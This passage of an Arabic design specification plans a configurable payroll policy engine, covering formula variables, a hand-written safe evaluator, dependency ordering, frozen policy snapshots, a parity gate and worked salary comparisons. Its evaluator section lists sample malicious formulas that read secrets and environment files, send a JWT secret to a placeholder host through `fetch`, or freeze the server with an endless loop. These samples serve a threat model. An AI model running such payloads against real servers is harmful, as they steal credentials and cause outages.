> **`fieldPath` لازم قائمة بيضاء صريحة** — لا انعكاس حر على كيان `Employee`، وإلا يقدر مستخدم يقرأ `nationalId` أو `iban` ويحقنه في قسيمة راتب.

#### (هـ) أطقم الشرائح — ترقية `lateness_tiers`

الجدول الحالي (`payroll-rules.entities.ts:9-34`) عام ولا يعرف السياسة. الترقية:

```sql
payroll_tier_sets
  id, versionId INT NULL FK, code, nameAr, inputVar, isActive
  -- versionId = NULL → طقم مشترك بين السياسات

ALTER TABLE lateness_tiers ADD tierSetId INT NULL FK
-- + توسيع mode:
--   FRACTION   : value × DAY_RATE              (موجود، payroll.service.ts:79)
--   MINUTES    : input × MINUTE_RATE           (موجود، :80)
--   MULTIPLIER : input × value × MINUTE_RATE   ← ناقص، مطلوب في المواصفة ⑤
--   FIXED      : value                          ← جديد
--   FORMULA    : evalFormula(expr)              ← جديد
```

**الهجرة الآمنة:** إنشاء طقم `LEGACY_LATE` وربط كل صفوف `lateness_tiers` الحالية به → السلوك لا يتغيّر لحظة الترقية، وهو شرط بوابة التكافؤ (٣-٧).

#### (و) تعديلات على المسير والبنود

```sql
ALTER TABLE payroll_runs ADD
  policyVersionId INT NULL,          -- الجديد (policyId موجود: payroll.entities.ts:50-51)
  policySnapshot  NVARCHAR(MAX) NULL,
  snapshotHash    NVARCHAR(64) NULL

-- جدول جديد: بند لكل مكوّن لكل موظف
payroll_item_components
  id, itemId INT FK, code, nameAr, stage,
  amount DECIMAL(18,2),
  sourceKind NVARCHAR(20),           -- TIERED / FORMULA / LEDGER ...
  sourceRef  NVARCHAR(MAX),          -- JSON: أي شريحة طُبّقت، أي صفوف حضور، أي قيود
  exemptedBy INT NULL                -- من أعفى (بند ⑧)
```

> **ليه جدول أبناء؟** `PayrollItem` اليوم أعمدة ثابتة (`payroll.entities.ts:112-156`) — 14 عموداً. سياسة فيها 20 بنداً مستحيل تُخزَّن فيها. الحل: البنود تُخزَّن في الجدول الابن، **والأعمدة القديمة تظل تُملأ كمجاميع (roll-up)** عبر `rollupTo` — وهذا بالضبط ما يجعل بوابة التكافؤ ممكنة والقسائم والتقارير القديمة تعمل بلا تعديل.

**ترتيب اختيار السياسة عند الحساب:**
```
run.policyVersionId → موجود؟ استخدمه
  → لا: سياسة مربوطة بنطاق المسير (branch/department mapping)
  → لا: سياسة الشركة الافتراضية (SYSTEM_DEFAULT)
  → لا: المسار القديم المثبّت (LEGACY)   ← الوضع الحالي 100%
```

---

### ٣-٣) كتالوج المتغيرات — تفعيل الكود الميت

**الوضع:** `payroll-variables.ts:14-39` فيه 18 متغيراً بتعريف نظيف (`code`, `nameAr`, `group`). لكن التعليق في `:5` يقول «يُبنى قاموسها لكل موظف في `buildContext()`» — و**`buildContext()` غير موجودة في المشروع**. الملف مُصدَّر ولا أحد يستورده. هو ملف توثيق حالياً، لا أكثر.

**التفعيل = ثلاث خطوات:**
1. ملف جديد `api/src/payroll/payroll-context.ts` فيه `buildContext()` — تبني القاموس من نفس المصادر التي تقرأها الحلقة اليوم.
2. endpoint `GET /payroll/variables` يرجّع `PAYROLL_VARIABLES` للواجهة (رقائق المتغيرات في محرّر المعادلة).
3. `validateFormula(expr, PAYROLL_VARIABLE_CODES.concat(prevComponentCodes))` عند حفظ أي بند.

#### الكتالوج المقترح (الموجود + المطلوب إضافته)

| الكود | المعنى | الحالة | المصدر في الكود |
|---|---|---|---|
| `BASIC` | الأساسي | موجود | `payroll.service.ts:225` |
| `HOUSING` · `TRANSPORT` · `OTHER_ALLOWANCE` | البدلات الثلاثة | موجود | `:228-230` |
| **`PHONE_ALLOWANCE`** · **`WORK_NATURE_ALLOWANCE`** | بدل هاتف/طبيعة عمل | **ناقص** | العمودان موجودان (`employee.entity.ts:214, 217`) و**لا يُجمعان في المسير** — نفس الثغرة في الكتالوج وفي الحساب |
| `GROSS` | الإجمالي | موجود | `:231` |
| `DAY_RATE` · `HOUR_RATE` · `MINUTE_RATE` | المعدلات المشتقة | موجود | `:232-234` |
| `MONTHLY_DAYS` · `DAILY_HOURS` | المقامات | موجود | `:197-198` |
| `LATE_MINUTES` | دقائق التأخير | موجود | `:263-266` |
| **`DEDUCTIBLE_MINUTES`** | دقائق إذن «بخصم» | **ناقص من الكتالوج** رغم أنه يُخصم فعلياً | `:275` |
| **`SHORTFALL_MINUTES`** | نقص ساعات الوردية المرنة | **ناقص** — حالياً مدسوس داخل `lateMinutes` | `attendance.service.ts:1097` (فجوة F3 في تدقيق الحضور) |
| **`EARLY_LEAVE_MINUTES`** | انصراف مبكر | **ناقص** — يُحسب ولا يُخصم إطلاقاً | `attendance.service.ts:1128` · صفر أثر في `payroll/` |
| `LATE_DAYS` · `ABSENT_DAYS` · `UNPAID_LEAVE_DAYS` · `WORKED_DAYS` | عدّادات الأيام | موجود | `:284-285, 303-306` |
| **`ABSENCE_PENALTY`** | معامل عقوبة الغياب | **ناقص** رغم استخدامه | `:206-208, 286` |
| **`SCHEDULED_DAYS`** · **`PERIOD_DAYS`** | أيام العمل المجدولة / أيام الفترة | **ناقص** — لازم للتناسب (prorate) | — |
| `OT_HOURS` · `OT_AMOUNT` | الأوفرتايم | موجود | `:244-253` |
| **`OT_HOURS_WEEKDAY/WEEKEND/HOLIDAY`** | تفصيل بمعامل اليوم | **ناقص** | `attendance.service.ts:1187-1190` |
| `LOAN_DUE` | أقساط السلف | موجود | `:323-325` |
| **`LEDGER_DEBIT`** · **`LEDGER_CREDIT`** | دفتر المديونيات | **ناقص** رغم استخدامه | `:334-343` |
| **`LEDGER_<CATEGORY>`** | خصم جودة/التزام/إداري | **ناقص** — يخدم بند ⑦ | `financial.entities.ts:71-73` |
| **`IS_ATTENDANCE_EXEMPT`** | 1/0 | **ناقص** — بند ⑨ غير موجود أصلاً | — |
| **`SERVICE_MONTHS`** | مدة الخدمة | **ناقص** | `employee.entity.ts` (joinDate) |
| **`C_<CODE>`** | ناتج بند سابق في نفس السياسة | **ناقص — أساسي للاعتماد المتبادل** | — |

#### `buildContext()` — الشكل المطلوب

```ts
// api/src/payroll/payroll-context.ts  (جديد)
export interface PayrollCtx {
  vars: Record<string, number>
  refs: {                       // للتتبّع في sourceRef
    attendanceDayIds: number[]; overtimeEntryIds: number[]
    installmentIds: number[];   obligationIds: number[]
    absentDates: string[];      unpaidLeaveIds: number[]
  }
  perDay: Array<{ date: string; lateMinutes: number; deductibleMinutes: number
                  shortfallMinutes: number; earlyLeaveMinutes: number
                  status: string; attendanceDayId: number }>   // لـ applyMode=PER_DAY
}

async function buildContext(emp, pol, startDate, endDate): Promise<PayrollCtx>
```

**قاعدة معمارية إلزامية — «قاعدة المعدلات تُحسب قبل بنود السياسة»:**
`DAY_RATE`/`HOUR_RATE`/`MINUTE_RATE` تُشتق من `rateBase` المأخوذ من **ملف الموظف فقط** (المرحلة 0)، **لا من نواتج بنود السياسة**. لولا ذلك: بند «بدل طبيعة عمل» يرفع `GROSS` → يرفع `DAY_RATE` → يرفع خصم الغياب → دورة لا تنتهي. لو احتاج المستخدم قاعدة مختلفة يستعمل `rateBaseFormula` — وهي تُقيَّم على متغيرات المرحلة 0 حصراً، والمُقيّم يرفض أي `C_*` فيها.

---

### ٣-٤) مُقيّم المعادلات الآمن

#### ليه مش `eval`؟

المعادلات **تأتي من قاعدة البيانات ويكتبها موظف موارد بشرية من شاشة**. `eval` أو `new Function` على نص من الـDB = **تنفيذ كود عشوائي على سيرفر الـAPI**:

| الخطر | مثال المعادلة الخبيثة |
|---|---|
| تسريب أسرار | `process.env.DB_PASSWORD` |
| قراءة/كتابة ملفات | `require('fs').readFileSync('/api/.env')` |
| اتصال خارجي | `fetch('http://x/?d='+process.env.JWT_SECRET)` |
| تجميد الخدمة | `while(1){}` — المسير يعلّق والـAPI كلها تسقط |
| إفساد البيانات | `require('typeorm')...` |

المُقيّم عندنا (`safe-formula.ts`) **parser تنازلي يدوي**: لا حلقات، لا وصول لأي كائن JS، مدخل محدود بـ500 حرف → **انتهاء مضمون** ولا سطح هجوم.

#### المسموح والممنوع — كما هو مُنفَّذ فعلاً

| البند | التفاصيل | السطر |
|---|---|---|
| أرقام | `12` · `0.5` · `.5` | `:44-63` |
| متغيرات | من القاموس فقط — غير معروف ⇒ **خطأ** | `:200-202` |
| عمليات | `+ − * / %` + سالب/موجب أحادي | `:78-81, 154-165` |
| أقواس | نعم، متداخلة | `:170-175` |
| دوال بيضاء | `min max abs floor ceil round(x[,d]) clamp(x,lo,hi)` | `:11-26` |
| أي رمز آخر | **خطأ فوري** «رمز غير مسموح في المعادلة» | `:98` |
| أي دالة خارج القائمة | **خطأ** «دالة غير مسموحة» | `:181` |
| رموز زائدة بعد النهاية | **خطأ** (يمنع الحقن اللاصق) | `:123-125` |
| الطول الأقصى | 500 حرف | `:9, 213` |
| **القسمة على صفر** | تُرجع **0** ولا ترمي — «لا تكسر المسير» | `:148-150` |
| ناتج `NaN/Infinity` | يُصفَّر | `:204, 217` |

#### فجوة حقيقية في المُقيّم: **لا شروط ولا مقارنات**

مفيش `>` ولا `<` ولا `if`. يعني معادلة زي «لو التأخير أكثر من ساعتين اخصم نصف يوم» **مستحيل التعبير عنها كمعادلة** — لازم تمر عبر `TIERED`. ده مقبول لأغلب الحالات، لكن التوصية إضافة **دوال** (بلا أي تعديل على الـparser، أضف مدخلات في `FUNCS` عند `safe-formula.ts:11`):

```
gt(a,b) gte(a,b) lt(a,b) lte(a,b) eq(a,b)   →  1 أو 0
ifp(c, a, b)                                 →  c > 0 ? a : b
```
`ifp` تُقيّم كل وسائطها مسبقاً (لا كسل) — آمن لأن مفيش آثار جانبية، والقسمة على صفر في الفرع غير المأخوذ مُحيَّدة أصلاً بـ`:148-150`.

مثال بعدها: `ifp(gt(LATE_MINUTES,120), DAY_RATE*0.5, LATE_MINUTES*MINUTE_RATE)`

#### التحقق قبل الحفظ (إلزامي)

```ts
// عند POST/PATCH لبند سياسة valueSource='FORMULA'
const allowed = [
  ...PAYROLL_VARIABLE_CODES,                    // payroll-variables.ts:39
  ...componentsBefore.map(c => 'C_' + c.code),  // البنود السابقة فقط
]
const res = validateFormula(dto.formula, allowed)   // safe-formula.ts:222
if (!res.ok) throw new BadRequestException(`معادلة غير صالحة: ${res.error}`)
```
`validateFormula` تحقن **1** لكل متغير وتقيّم فعلياً (`:228-229`) — فتكشف الأخطاء النحوية وأسماء المتغيرات المجهولة معاً.

**بالإضافة (مطلوب في الواجهة):** زر **«جرّب على موظف»** — يبني `buildContext()` لموظف مختار في فترة مختارة ويعرض الناتج الرقمي قبل الحفظ. الفرق بين المعادلة الصحيحة نحوياً والمعادلة الصحيحة **معنىً** لا يكشفه إلا التجريب.

#### القسمة على صفر — قرار يستحق نقاشاً

السلوك الحالي (يرجّع 0 صامتاً) يمنع انهيار المسير، لكنه **يخفي أخطاء**: `GROSS / WORKED_DAYS` لموظف اشتغل 0 يوم يرجّع **0 بدل خطأ**، والبند يُدفع صفراً بلا تنبيه. التوصية:

| الوضع | السلوك |
|---|---|
| وقت **التحقق/المعاينة** | ارمِ خطأً واضحاً «قسمة على صفر محتملة» |
| وقت **تشغيل المسير** | أرجِع 0 (كما هو) + **سجّل تحذيراً في `sourceRef`** وأظهره في تقرير المسير كعلم أصفر |

---

### ٣-٥) ترتيب التنفيذ ومنع الحلقات

#### المراحل (Stages) — ثابتة ولا يعدّلها المستخدم

```
المرحلة 0  RATE BASE   قاعدة المعدلات + متغيرات الكتالوج (من ملف الموظف والحضور)
           ↓            لا تقرأ أي C_* — إطلاقاً
المرحلة 1  EARNING     الاستحقاقات (أساسي، بدلات، أوفرتايم، مكافآت)
           ↓            تقرأ: المرحلة 0 + C_* من نفس المرحلة
المرحلة 2  DEDUCTION   الخصومات (تأخير، غياب، إجازات، سلف، مديونيات)
           ↓            تقرأ: المرحلة 0 + كل C_* من المرحلة 1 + C_* من نفس المرحلة
المرحلة 3  EXEMPTION   الإعفاءات الفردية — تُصفّر بنوداً exemptible=1 (بند ⑧)
           ↓
المرحلة 4  NET         الصافي = Σ EARNING − Σ DEDUCTION، ثم الأرضية والترحيل والتقريب
```

**قاعدة الاتجاه الواحد** (`stage(dependency) ≤ stage(component)`) هي **أقوى حماية من الحلقات**: بند خصم يقدر يقرأ استحقاقاً، لكن استحقاق **لا يقدر** يقرأ خصماً. ده وحده بيقتل أغلب الدورات قبل ما تتكوّن.

#### داخل المرحلة الواحدة — ترتيب طوبولوجي

```
1. حلّل معادلة كل بند واستخرج مراجع C_*        (نفس tokenizer المُقيّم)
2. ابنِ رسماً موجهاً: C_A → C_B  يعني «B يعتمد على A»
3. DFS بثلاثة ألوان (أبيض/رمادي/أسود):
     لقاء عقدة رمادية = حلقة → ارفض الحفظ واعرض المسار كاملاً
     «حلقة في المعادلات: LATE_DED → NET_ADJ → LATE_DED»
4. الترتيب الطوبولوجي هو ترتيب التنفيذ
5. تعادل (بندان مستقلان)؟ افصل بـ seq ثم بـ code أبجدياً  ← حتمية كاملة
```

**التحقق يتم لحظة الحفظ لا لحظة التشغيل.** سياسة فيها حلقة **لا تُحفظ أصلاً**، فمستحيل أن ينهار مسير في منتصف صرف الرواتب.

#### حارس إضافي وقت التشغيل

عدّاد بنود بحد أقصى `versionComponents.length` تكرار — لو تجاوزه (بسبب بيانات فاسدة تجاوزت التحقق) يرمي فوراً بدل الدوران. حزام أمان فوق حمّالة الأمان.

#### مثال محسوب على الترتيب

سياسة فيها:
```
seq 10  C_BASIC       EARNING    EMPLOYEE_FIELD basicSalary          = 6000.00
seq 20  C_HOUSING     EARNING    EMPLOYEE_FIELD housingAllowance     = 1500.00
seq 30  C_NATURE      EARNING    FORMULA  C_BASIC * 0.05             =  300.00
seq 40  C_OT          EARNING    SYSTEM_VAR OT_AMOUNT                =  300.00
seq 50  C_LATE        DEDUCTION  TIERED(LATE_SET, LATE_MINUTES, PER_DAY)
seq 60  C_ABSENCE     DEDUCTION  FORMULA  ABSENT_DAYS*DAY_RATE*ABSENCE_PENALTY
seq 70  C_TOTAL_DED   DEDUCTION  FORMULA  C_LATE + C_ABSENCE
seq 80  C_CAP         DEDUCTION  FORMULA  min(0, (C_BASIC+C_HOUSING)*0.5 - C_TOTAL_DED)
```
- `C_NATURE` يعتمد على `C_BASIC` → لازم بعده. الترتيب الطوبولوجي: 10 → 30.
- `C_TOTAL_DED` يعتمد على 50 و60 → لازم بعدهما.
- `C_CAP` يعتمد على 10, 20, 70 — كلها في مراحل ≤ مرحلته → **مسموح**.
- لو أحد كتب في `C_BASIC` معادلة تشير لـ`C_CAP` → **رفض عند الحفظ** (استحقاق يقرأ خصماً = مخالفة اتجاه) وقبلها رفض بالحلقة.

---

### ٣-٦) لقطة السياسة على المسير (Policy Snapshot)

#### المشكلة بالضبط

الشرائح اليوم تُقرأ لحظة الحساب من `lateness_tiers` بـ`{isActive:true}` فقط (`payroll.service.ts:202-205`)، والمفاتيح من `RequestsConfig` (`:197-200`). يعني: **لو غيّرت شريحة اليوم، أي إعادة حساب لأي مسير قديم تنتج أرقاماً مختلفة**. الحماية الوحيدة الموجودة هي منع إعادة حساب مسير معتمد (`payroll.service.ts:171-175`) — وهي **حماية للأرقام المخزّنة فقط، لا لقابلية إعادة إنتاجها**. لو سألك مراجع «ازاي طلع الرقم ده؟» مفيش إجابة قابلة للإثبات.

#### الآلية المقترحة — دفاع بثلاث طبقات

**الطبقة ١ — نسخة مجمّدة (المرجع المنطقي)**
`PayrollRun.policyVersionId` يشير لصف `payroll_policy_versions` عليه `frozenAt`. أول ما نسخة تُستخدم في أي مسير: `frozenAt = now()`، وأي تعديل لاحق يستنسخ نسخة جديدة تلقائياً. **الصف الأصلي لا يُعدَّل ولا يُحذف أبداً** — حذف نسخة مستخدمة ممنوع بـFK.

**الطبقة ٢ — لقطة JSON كاملة (المرجع المادي)**
لحظة `calculateDefined` يُبنى ويُخزَّن في `PayrollRun.policySnapshot`:

```json
{
  "capturedAt": "2026-08-16T09:12:44Z",
  "policy":  { "id": 3, "code": "RIYADH_LENIENT", "name": "سياسة فرع الرياض" },
  "version": { "id": 12, "versionNo": 2, "monthlyDays": 30, "dailyHours": 8,
               "rateBase": "GROSS", "roundingMode": "HALF_UP", "roundingScale": 2,
               "netFloor": 0, "cycleStartDay": 23, "cycleEndMode": "DERIVED" },
  "components": [ { "seq":10, "code":"BASIC", "stage":"EARNING",
                    "valueSource":"EMPLOYEE_FIELD", "fieldPath":"basicSalary",
                    "rollupTo":"basicSalary" }, "... كل البنود كما هي ..." ],
  "tierSets": [ { "code":"LATE_SET", "inputVar":"LATE_MINUTES", "applyMode":"PER_DAY",
                  "tiers":[ {"from":1,"to":30,"mode":"MINUTES","value":0},
                            {"from":31,"to":120,"mode":"MULTIPLIER","value":1.5},
                            {"from":121,"to":null,"mode":"FRACTION","value":0.25} ] } ],
  "configKeys": { "attendance.absence_penalty_days":"1",
                  "payroll.late_deduction_enabled":"true",
                  "overtime.multiplier_weekday":"1.5" }
}
```
> **لاحظ `configKeys`:** المفاتيح العامة تدخل الحساب اليوم (`payroll.service.ts:206-208`) وهي **قابلة للتغيير من شاشة الإعدادات في أي لحظة**. بدون تجميدها في اللقطة، المسير غير قابل لإعادة الإنتاج مهما جمّدنا السياسة.

**الطبقة ٣ — بصمة تحقق**
`snapshotHash = SHA-256(canonical_json(policySnapshot))`. عند فتح شاشة المسير: أعِد الحساب وقارن. اختلاف = **علم أحمر «اللقطة عُبث بها»**. تكلفتها صفر عملياً وتغلق باب التلاعب المباشر في الـDB.

#### قواعد التشغيل

| الحدث | السلوك |
|---|---|
| مسير `CALCULATED` يُعاد حسابه | يقرأ **النسخة النشطة الحالية** ويعيد بناء اللقطة — سلوك مقصود ويجب إظهاره: «تنبيه: السياسة تغيّرت من v2 إلى v3 منذ آخر حساب» |
| مسير `APPROVED` أو `PAID` | **لا يُعاد حسابه إطلاقاً** — مُنفَّذ فعلاً (`payroll.service.ts:171-175`) |
| قراءة/طباعة مسير قديم | تُقرأ من `policySnapshot` **لا** من جداول السياسة الحيّة |
| أُرشفت السياسة | المسيرات القديمة تُقرأ طبيعي؛ لا تظهر لمسير جديد |
| حذف/تعديل نسخة مستخدمة | ممنوع بـFK + `frozenAt` |

---

### ٣-٧) بوابة التكافؤ (Parity Gate)

**المبدأ:** لا يُسمح بتفعيل المحرك الجديد قبل إثبات أن السياسة الافتراضية تنتج **نفس الأرقام بالضبط** التي ينتجها `payroll.service.ts:224-396` اليوم. أي بند مالي مختلف بقرش واحد على موظف واحد = **البوابة مقفولة**.

#### الخطوة ١ — سياسة `SYSTEM_DEFAULT_V1` تُنسخ حرفياً من الكود القائم

| seq | code | stage | التعريف | `rollupTo` | يقابل في الكود |
|---|---|---|---|---|---|
| 10 | `BASIC` | EARNING | `EMPLOYEE_FIELD basicSalary` | `basicSalary` | `payroll.service.ts:225` |
| 20 | `ALLOW_HOUSING` | EARNING | `EMPLOYEE_FIELD housingAllowance` | `allowances` | `:228` |
| 30 | `ALLOW_TRANSPORT` | EARNING | `EMPLOYEE_FIELD transportAllowance` | `allowances` | `:229` |
| 40 | `ALLOW_OTHER` | EARNING | `EMPLOYEE_FIELD otherAllowance` | `allowances` | `:230` |
| 50 | `OT_PAY` | EARNING | `SYSTEM_VAR OT_AMOUNT` | `overtimeAmount` | `:247-253` |
| 60 | `LEDGER_CREDIT` | EARNING | `LEDGER * CREDIT` | `otherAdditions` | `:339-343` |
| 70 | `LATE_DED` | DEDUCTION | `TIERED(LEGACY_LATE, LATE_MINUTES, PER_DAY)` | `latenessDeduction` | `:269-279` |
| 80 | `PERMIT_DED` | DEDUCTION | `FORMULA DEDUCTIBLE_MINUTES * MINUTE_RATE` | `latenessDeduction` | `:275` |
| 90 | `ABSENCE_DED` | DEDUCTION | `FORMULA ABSENT_DAYS*DAY_RATE*ABSENCE_PENALTY` | `absenceDeduction` | `:286` |
| 100 | `UNPAID_DED` | DEDUCTION | `FORMULA UNPAID_LEAVE_DAYS * DAY_RATE` | `unpaidLeaveDeduction` | `:307` |
| 110 | `LOAN_DED` | DEDUCTION | `SYSTEM_VAR LOAN_DUE` | `loanInstallments` | `:323-325` |
| 120 | `LEDGER_DEBIT` | DEDUCTION | `LEDGER * DEBIT` | `otherDeductions` | `:334-338` |
| 130 | `LATE_MIN_INFO` | INFO | `FORMULA LATE_MINUTES + DEDUCTIBLE_MINUTES` | `lateMinutes` | `:263-266` |

#### الخطوة ٢ — مصائد التكافؤ (هنا تُهدر الأسابيع لو تجاهلتها)

| # | المصيدة | لماذا تكسر التكافؤ | القاعدة الصحيحة |
|---|---|---|---|
| T1 | **موضع التقريب** | القديم يجمع `LATE_DED + PERMIT_DED` **داخل reduce واحد ثم يقرّب مرة واحدة** (`:270-278`). لو قرّبنا كل بند لوحده ثم جمعنا → فرق حتى 0.01 | تقريب البنود عند **الـroll-up فقط**، لا عند كل بند. الأعمدة المشتركة في `rollupTo` تُجمَع خاماً ثم تُقرَّب مرة |
| T2 | **الشريحة بأول تطابق** | `tiers.find(...)` (`:72-76`) — **أول شريحة مطابقة تفوز** بعد `order: fromMinutes ASC` (`:204`). مع شرائح متداخلة (والنظام لا يمنع التداخل — `payroll-rules.service.ts:33-47`) الترتيب يحدد النتيجة | نفس الترتيب ونفس دلالة first-match حرفياً |
| T3 | **لا شريحة مطابقة** | fallback = خصم بالدقيقة 1:1 (`:77`)، **ليس صفراً** | البند TIERED لازم يحمل `fallbackMode='MINUTES'` |
| T4 | **`applyMode` = PER_DAY** | الشرائح تُطبَّق **لكل يوم على حدة** لا على مجموع الفترة | `PER_DAY` إلزامي في `SYSTEM_DEFAULT_V1` |
| T5 | **`lateEnabled` مفتاح عام** | لو `false` → الخصم كله **صفر** (`:199-200, 269`) | تُنقل لـ`version.lateDeductionEnabled` وتُجمَّد في اللقطة |
| T6 | **تقريب الصافي مرتين** | الصافي يُحسب من مجاميع **مقرَّبة سلفاً** ثم يُقرَّب (`:345-354`) | نفس التسلسل بالضبط |
| T7 | **قاعدة المعدلات** | `dayRate = GROSS/30` حيث GROSS = أساسي + 3 بدلات فقط (`:227-232`) — **بدل الهاتف وطبيعة العمل غير مشمولين** | `SYSTEM_DEFAULT_V1` **لا تضيفهما** حتى تعبر البوابة؛ إضافتهما تغيير سياسة منفصل بعد التبديل |
| T8 | **`materializeAbsences` قبل القراءة** | تكتب صفوف حضور جديدة (`:259`) — تشغيلها مرتين يغيّر البيانات | في وضع الظل: **لا تُشغَّل** — اقرأ نفس الصفوف التي قرأها المسير الأصلي |

#### الخطوة ٣ — أداة الاختبار

```
GET /payroll/policies/:versionId/parity?periods=2026-05,2026-06,2026-07

لكل مسير معتمد في تلك الفترات:
  legacy  = صفوف payroll_items المخزّنة
  shadow  = calculateDefined({ ...نفس النطاق, policyVersionId, dryRun: true })
  قارن الـ14 عموداً لكل موظف:
    basicSalary · allowances · overtimeHours · overtimeAmount · lateMinutes
    latenessDeduction · absenceDays · absenceDeduction · unpaidLeaveDays
    unpaidLeaveDeduction · loanInstallments · otherDeductions
    otherAdditions · netPay
```
> **مطلوب أولاً:** إضافة `dryRun` لـ`calculateDefined` — اليوم تكتب دائماً (`payroll.service.ts:357, 398-400`)، فمستحيل تشغيلها للمقارنة بلا تلويث البيانات.

**معيار العبور:**

| المقياس | الحد المطلوب |
|---|---|
| عدد الفترات | ≥ 3 فترات متتالية |
| النطاق | **كل الفروع والأقسام** — لا عيّنة |
| `netPay` | **فرق 0.00 مطلقاً** على 100% من البنود |
| باقي الـ13 عموداً | `\|Δ\| ≤ 0.01` (فروق تقريب مقبولة)، ومجموع الفروق على المسير = 0.00 |
| حالات حدّية إلزامية | موظف بلا حضور · موظف كله غياب · موظف بسلفة · صافي قريب من الصفر · موظف انضم داخل الفترة |

#### الخطوة ٤ — التبديل التدريجي

مفتاح `payroll.engine_mode`:

| القيمة | السلوك |
|---|---|
| `LEGACY` | القديم فقط (الوضع الحالي، الافتراضي) |
| `SHADOW` | القديم **هو** المصدر المخزَّن، والمحرك يعمل في الذاكرة ويُسجَّل الفرق في لوج للتدقيق. **يُشغَّل شهرين كاملين على الأقل** |
| `POLICY` | المحرك هو المصدر — الرجوع للخلف بضبط `run.policyVersionId = null` لكل مسير |

**التراجع لحظي وبلا هجرة بيانات**: `policyVersionId = null` ⇒ المسار القديم. الحساب القديم يظل موجوداً في الكود ولا يُحذف قبل مرور 6 دورات ناجحة.

---

### ٣-٨) مثال شامل: سياستان على نفس الموظف

#### المعطيات (ثابتة للحالتين)

| البند | القيمة |
|---|---|
| الأساسي | 6,000.00 |
| بدل سكن | 1,500.00 |
| بدل انتقال | 500.00 |
| **الإجمالي (GROSS)** | **8,000.00** |
| `MONTHLY_DAYS` / `DAILY_HOURS` | 30 / 8 |
| `DAY_RATE` = 8000 ÷ 30 | **266.6667** |
| `HOUR_RATE` = 266.6667 ÷ 8 | **33.3333** |
| `MINUTE_RATE` = 33.3333 ÷ 60 | **0.555556** |
| أيام تأخير مسجّلة | 25 د · 75 د · 140 د |
| أيام غياب بلا إذن | 1 يوم |
| أوفرتايم معتمد | 6 ساعات × معامل 1.5 |

**الأوفرتايم (متطابق في الحالتين):** `6 × 1.5 × 33.3333 = 300.00`

#### السياسة أ — «فرع الرياض» (متساهلة)

بنود إضافية: `C_NATURE = BASIC × 0.05` (بدل طبيعة عمل) · معامل الغياب = **1.0**
طقم الشرائح `RIYADH_LATE` (applyMode = PER_DAY):

| الشريحة | النمط | القيمة |
|---|---|---|
| 1 – 30 د | `MINUTES` | — (1:1) |
| 31 – 120 د | `MULTIPLIER` | 1.5 |
| 121 د فأكثر | `FRACTION` | 0.25 يوم |

```
يوم 25 د  → MINUTES     :  25 × 0.555556                =  13.8889
يوم 75 د  → MULTIPLIER  :  75 × 1.5 × 0.555556          =  62.5000
يوم 140 د → FRACTION    :  0.25 × 266.6667              =  66.6667
                          ─────────────────────────────────────────
C_LATE (خصم التأخير)                                    = 143.06
C_ABSENCE = 1 × 266.6667 × 1.0                          = 266.67
C_NATURE  = 6000 × 0.05                                 = +300.00
```

#### السياسة ب — «فرع النصر» (صارمة)

بلا `C_NATURE` · معامل الغياب = **2.0**
طقم الشرائح `NASR_LATE` (applyMode = PER_DAY):

| الشريحة | النمط | القيمة |
|---|---|---|
| 1 – 30 د | `MULTIPLIER` | 2.0 |
| 31 – 120 د | `FRACTION` | 0.25 يوم |
| 121 د فأكثر | `FRACTION` | 0.50 يوم |

```
يوم 25 د  → MULTIPLIER  :  25 × 2 × 0.555556            =  27.7778
يوم 75 د  → FRACTION    :  0.25 × 266.6667              =  66.6667
يوم 140 د → FRACTION    :  0.50 × 266.6667              = 133.3333
                          ─────────────────────────────────────────
C_LATE                                                  = 227.78
C_ABSENCE = 1 × 266.6667 × 2.0                          = 533.33
```

#### المقارنة النهائية

| البند | سياسة الرياض | سياسة النصر | الفرق |
|---|---:|---:|---:|
| الإجمالي (أساسي + بدلات) | 8,000.00 | 8,000.00 | 0.00 |
| بدل طبيعة عمل (بند سياسة) | +300.00 | 0.00 | **+300.00** |
| أوفرتايم | +300.00 | +300.00 | 0.00 |
| خصم التأخير | −143.06 | −227.78 | **−84.72** |
| خصم الغياب | −533.33 → **−266.67** | −533.33 | **−266.66** |
| **إجمالي الخصومات** | **−409.73** | **−761.11** | **−351.38** |
| **صافي المستحق** | **8,190.27** | **7,538.89** | **651.38** |

**القراءة لصاحب النظام:** نفس الموظف بالحرف — نفس الراتب، نفس التأخير، نفس الغياب، نفس الأوفرتايم — والفرق **651.38 ريال في الشهر** لمجرد أن مسيره مربوط بسياسة مختلفة. هذا هو بالضبط ما تطلبه المواصفة في البند ③، وهو **مستحيل اليوم**: شرائح واحدة عامة (`payroll-rules.entities.ts` بلا `policyId`) ومعامل غياب واحد عام (`attendance.absence_penalty_days`) ولا وجود لبند «بدل طبيعة عمل» أصلاً في الحساب.

**ولاحظ:** كل الأرقام أعلاه ناتجة عن **بيانات إدخال واحدة** — الفرق كله في **التعريف** لا في الكود. هذا هو معيار نجاح المحرك.

---

### ٣-٩) حالات حدّية — القرار المطلوب لكل واحدة

| # | الحالة | المخاطرة | القرار المقترح |
|---|---|---|---|
| 1 | موظف في **مسيرين بسياستين** لنفس الفترة | **ازدواج صرف** | `PayrollRunMember` موجود ككيان (`payroll.entities.ts:82-95`) لكنه **لا يُقرأ في أي مكان** — يُكتب `:217-221` ويُحذف `:194` فقط. لازم guard: عند الحساب، ارفض/حذّر لو الموظف عضو في مسير آخر بفترة متقاطعة |
| 2 | متغير في المعادلة غير معروف | خطأ صامت | **خطأ عند الحفظ** (`safe-formula.ts:200-202` يرمي بالفعل) — لا يصل للتشغيل |
| 3 | متغير معروف لكن قيمته `null` | يُقرأ صفراً بلا تنبيه | صفّره + سجّل تحذيراً في `sourceRef`؛ لا توقف المسير |
| 4 | **قسمة على صفر** | 0 صامتة (`safe-formula.ts:148-150`) | خطأ في المعاينة، 0 + علم أصفر في التشغيل (انظر ٣-٤) |
| 5 | موظف **انضم داخل الفترة** | يُخصم عن أيام قبل التعيين | متغير `SCHEDULED_DAYS` + بند `PRORATE`. `materializeAbsences` تحترم `joinDate` بالفعل (`attendance.service.ts:552-575`) لكن **الراتب لا يُجزّأ** |
| 6 | موظف **أُنهيت خدمته داخل الفترة** | يُصرف له شهر كامل | `resolveScope` يفلتر بـ`isActive` فقط (`payroll.service.ts:110`) — لازم فلترة بتاريخ الإنهاء داخل الفترة |
| 7 | بند **استحقاق** ناتجه سالب | ينقلب لخصم خفي | `clamp(x,0,∞)` تلقائياً على EARNING، أو `minAmount=0` |
| 8 | بند **خصم** ناتجه سالب | ينقلب لاستحقاق خفي | نفس المعالجة على DEDUCTION |
